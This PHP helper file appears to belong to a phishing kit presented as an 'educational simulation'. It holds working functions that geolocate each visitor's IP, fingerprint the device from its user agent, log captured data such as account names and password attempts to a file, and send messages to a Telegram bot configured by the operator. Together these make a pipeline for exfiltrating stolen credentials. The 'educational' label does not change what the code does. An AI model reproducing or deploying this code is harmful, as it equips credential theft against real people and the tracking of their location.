<?php
// functions.php - Helper functions for the simulation
// EDUCATIONAL PURPOSE ONLY

require_once 'config.php';

/**
 * Get location from IP address using ip-api.com (free, no API key needed)
 */
function getLocationFromIP($ip) {
    // Skip location lookup for localhost
    if ($ip == '127.0.0.1' || $ip == '::1') {
        return 'Localhost (Development)';
    }
    
    // Use ip-api.com free service (limited to 45 requests/minute)
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,city,regionName,lat,lon";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode == 200 && $response) {
        $data = json_decode($response, true);
        if ($data && isset($data['status']) && $data['status'] == 'success') {
            $location = $data['city'] . ', ' . $data['regionName'] . ', ' . $data['country'];
            return $location;
        }
    }
    
    return 'Unknown Location';
}

/**
 * Get device type from User Agent
 */
function getDeviceType($userAgent) {
    $ua = strtolower($userAgent);
    
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipod') !== false) {
        return '📱 iPhone/iPod';
    } elseif (strpos($ua, 'ipad') !== false) {
        return '📱 iPad';
    } elseif (strpos($ua, 'android') !== false) {
        return '📱 Android Device';
    } elseif (strpos($ua, 'windows phone') !== false) {
        return '📱 Windows Phone';
    } elseif (strpos($ua, 'mac') !== false) {
        return '💻 Mac';
    } elseif (strpos($ua, 'windows') !== false) {
        return '💻 Windows PC';
    } elseif (strpos($ua, 'linux') !== false) {
        return '💻 Linux';
    } else {
        return '💻 Unknown Device';
    }
}

/**
 * Send message to Telegram bot
 */
function sendToTelegram($message) {
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    
    if ($botToken == 'YOUR_BOT_TOKEN_HERE' || $chatId == 'YOUR_CHAT_ID_HERE') {
        error_log("Telegram not configured. Message: " . $message);
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

/**
 * Log captured data to captures.txt file
 */
function logCapture($data, $stage) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $location = getLocationFromIP($ip);
    
    $logEntry = "========================================\n";
    $logEntry .= "TIME: {$timestamp}\n";
    $logEntry .= "IP: {$ip}\n";
    $logEntry .= "LOCATION: {$location}\n";
    $logEntry .= "STAGE: {$stage}\n";
    $logEntry .= "DATA: {$data}\n";
    $logEntry .= "USER-AGENT: {$userAgent}\n";
    $logEntry .= "========================================\n\n";
    
    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
}

/**
 * Get real IP address (handles proxies)
 */
function getRealIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    
    return $ip;
}

/**
 * Clear session data (for cleanup)
 */
function clearPhishingSession() {
    if (isset($_SESSION['user_account'])) {
        unset($_SESSION['user_account']);
    }
    if (isset($_SESSION['password_attempt'])) {
        unset($_SESSION['password_attempt']);
    }
}
?>